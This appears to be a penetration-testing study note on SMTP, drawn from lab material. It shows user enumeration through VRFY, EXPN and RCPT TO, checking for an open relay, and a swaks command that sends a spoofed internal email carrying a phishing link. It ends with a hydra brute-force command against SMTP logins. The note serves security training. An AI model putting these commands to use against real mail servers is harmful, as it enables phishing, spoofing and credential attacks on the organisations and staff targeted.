Attacks: [[Open Relay]]
Port:
	25 (Unencrypted)
	465 (+TLS)
	587 (Encrypted [[STARTTLS]])

Usually uses [[STARTTLS]] to encrypt

## Anti-Spam
With [[ESMPT]]+[[SMTP-Auth]] 
# Misconfiguration
## Authentication
The SMTP server has different commands that can be used to enumerate valid usernames `VRFY`, `EXPN`, and `RCPT TO`.
### `VRFY`
This instructs the receiving SMTP server to check the validity of a particular email username. The server responds whether the user exists or not. This could be disabled.
```shell-session
$ telnet 10.10.110.20 25
...
220 parrot ESMTP Postfix (Debian/GNU)

VRFY root
252 2.0.0 root

VRFY www-data
252 2.0.0 www-data

VRFY new-user
550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table
```
### `EXPN`
Similar to `VRFY`, except that when used with a distribution list, it will list all users on that list. This can be a bigger problem than the `VRFY` command since sites often have an alias such as "all."
```shell-session
$ telnet 10.10.110.20 25
...
220 parrot ESMTP Postfix (Debian/GNU)

EXPN john
250 2.1.0 john@inlanefreight.htb

EXPN support-team
250 2.0.0 carol@inlanefreight.htb
250 2.1.5 elisa@inlanefreight.htb
```
### `RCPT TO`
This identifies the recipient of the email message.
```shell-session
$ telnet 10.10.110.20 25
...
220 parrot ESMTP Postfix (Debian/GNU)

MAIL FROM:test@htb.com
it is
250 2.1.0 test@htb.com... Sender ok

RCPT TO:kate
550 5.1.1 kate... User unknown

RCPT TO:john
250 2.1.5 john... Recipient ok
```
## Open Relay
1. Check if Open Relay is configured or not
```shell-session
$ nmap -p25 -Pn --script smtp-open-relay <IP>
...
PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-open-relay: Server is an open relay (14/16 tests)
```
2. Use any mail client to connect to the mail server and send our email.
```shell-session
$ swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body '<TEXT> http://mycustomphishinglink.com/' --server <IP>

=== Trying 10.10.11.213:25...
=== Connected to 10.10.11.213.
<-  220 mail.localdomain SMTP Mailer ready
 -> EHLO parrot
<-  250-mail.localdomain
<-  250-SIZE 33554432
<-  250-8BITMIME
<-  250-STARTTLS
<-  250-AUTH LOGIN PLAIN CRAM-MD5 CRAM-SHA1
<-  250 HELP
 -> MAIL FROM:<notifications@inlanefreight.com>
<-  250 OK
 -> RCPT TO:<employees@inlanefreight.com>
<-  250 OK
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Thu, 29 Oct 2020 01:36:06 -0400
 -> To: employees@inlanefreight.com
 -> From: notifications@inlanefreight.com
 -> Subject: Company Notification
 -> Message-Id: <20201029013606.775675@parrot>
 -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
 -> 
 -> <TEXT> http://mycustomphishinglink.com/
 -> 
 -> 
 -> .
<-  250 OK
 -> QUIT
<-  221 Bye
=== Connection closed with remote host.
```
## Dangerous setting
If SMTP server has this config
```
mynetworks = 0.0.0.0/0
```
It can send fake emails and thus initialize communication between multiple parties. Another attack possibility would be to spoof the email and read it.
### User enum
Request might timeout so increase timeout period
## Tools
- [[SMTP-user-enum]]
- [[O365spray]] (O365)
- [[MailSniper]] (O365)
- [[CredKing]] (Gmail/Okta)
- [[Hydra#SMB/FTP/SSH/POP3/SMTP|Hydra-SMTP]] (usually blocked, try custom tools)
```shell-session
$ hydra -l user@domain.com -P <PASSWORD.TXT> -f 10.10.110.20 smtp
```
- [[Evolution]]